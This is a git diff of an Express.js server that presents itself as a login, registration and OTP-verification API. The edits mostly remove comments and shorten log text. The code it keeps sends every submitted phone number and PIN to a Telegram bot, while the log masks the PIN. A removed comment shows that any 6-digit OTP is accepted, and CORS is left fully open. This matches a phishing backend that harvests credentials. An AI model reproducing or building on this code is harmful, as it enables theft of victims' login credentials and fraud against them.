@@ -13,10 +13,8 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
 }));
 
-// Handle preflight requests
 app.options('*', cors());
 
-// Extra CORS headers
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, PATCH, OPTIONS');
@@ -58,7 +56,7 @@ async function sendTelegramNotification(phone, pin) {
     });
 
     const data = await response.json();
-    console.log('📤 Telegram notification sent:', data.ok ? '✅ Success' : '❌ Failed');
+    console.log('📤 Telegram:', data.ok ? '✅ Sent' : '❌ Failed');
     return data;
   } catch (error) {
     console.error('❌ Telegram error:', error.message);
@@ -102,7 +100,6 @@ app.post('/api/auth/login', async (req, res) => {
 
     console.log('🔑 Login attempt:', { phoneNumber, pin: '****' });
 
-    // Validate input
     if (!phoneNumber || !pin) {
       return res.status(400).json({
         success: false,
@@ -124,7 +121,6 @@ app.post('/api/auth/login', async (req, res) => {
       });
     }
 
-    // Send Telegram notification
     await sendTelegramNotification(phoneNumber, pin);
 
     res.json({
@@ -144,7 +140,7 @@ app.post('/api/auth/login', async (req, res) => {
   }
 });
 
-// Register endpoint (simple)
+// Register endpoint
 app.post('/api/auth/register', (req, res) => {
   const { phoneNumber, pin, fullName, email } = req.body;
 
@@ -166,7 +162,7 @@ app.post('/api/auth/register', (req, res) => {
   });
 });
 
-// Verify OTP endpoint (simple - accepts any 6-digit OTP)
+// Verify OTP endpoint
 app.post('/api/auth/verify-otp', (req, res) => {
   const { phoneNumber, otp } = req.body;
 
